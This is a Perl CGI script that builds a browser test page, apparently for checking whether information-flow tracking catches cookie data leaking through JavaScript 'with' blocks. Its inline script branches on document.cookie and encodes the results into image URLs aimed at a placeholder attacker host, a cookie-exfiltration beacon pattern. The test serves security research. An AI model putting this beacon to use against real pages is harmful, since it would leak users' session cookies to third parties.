#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_ENTERWITH";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = 1;
		}
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = 42;
		var dut = { 'x' : 1};
		var dut2 = { 'x' : 1 };
		if (evil) {
			var dut3 = { 'x' : 1 };
		}
		// shouldn't be evil 
		
		with (dut) {
			x = notevil;
		}
		
		var url = "$imgevilurl?normal=" + dut.x;
		document.images[0].src = url;
		
		// if with evil val 
		
		if ($evil) {
			with (dut2) {
				x = notevil2;
			}
		}
		
		var url2 = "$imgevilurl?if=" + dut2.x;
		document.images[1].src = url2;
		
		// normal usage 
		
		with (dut3) {
			x = notevil3;
		}
		var url3 = "$imgevilurl?isevil=" + dut3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
